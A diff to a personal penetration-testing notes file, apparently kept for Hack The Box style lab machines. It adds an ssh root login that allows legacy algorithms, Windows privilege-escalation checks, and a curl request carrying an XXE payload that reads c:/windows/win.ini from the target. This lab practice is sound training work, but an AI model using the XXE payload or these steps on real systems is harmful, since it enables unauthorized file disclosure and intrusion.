@@ -1,4 +1,9 @@
-# Linux
+```
+ssh -o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss root@10.129.229.183
+
+```
+
+# Windows
 
 ## Recon enumeration
 
@@ -20,7 +25,22 @@ mget *
 
 ## Privilege escalation
 
+```
+whoami /priv
+icacls job.bat
+```
+
 ## Services
+
+```
+ssh keys
+chmod 400 ssh
+```
+
+```
+curl 'http://10.129.95.192/process.php' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://10.129.95.192/services.php' -H 'Content-Type: text/xml' -H 'Origin: http://10.129.95.192' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=dtpedleb9pov5beljprnpkan7n' -H 'Sec-GPC: 1' --data-raw '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>'
+```
+
 
 #### Groovy
 
@@ -48,6 +68,11 @@ msf auxiliary(scanner/ssh/ssh_enumusers) > run
 # Linux
 
 ## Recon enumeration
+
+```
+about:config"
+security.tls.version.min
+```
 
 ```
 sudo nmap -sV 10.129.227.248
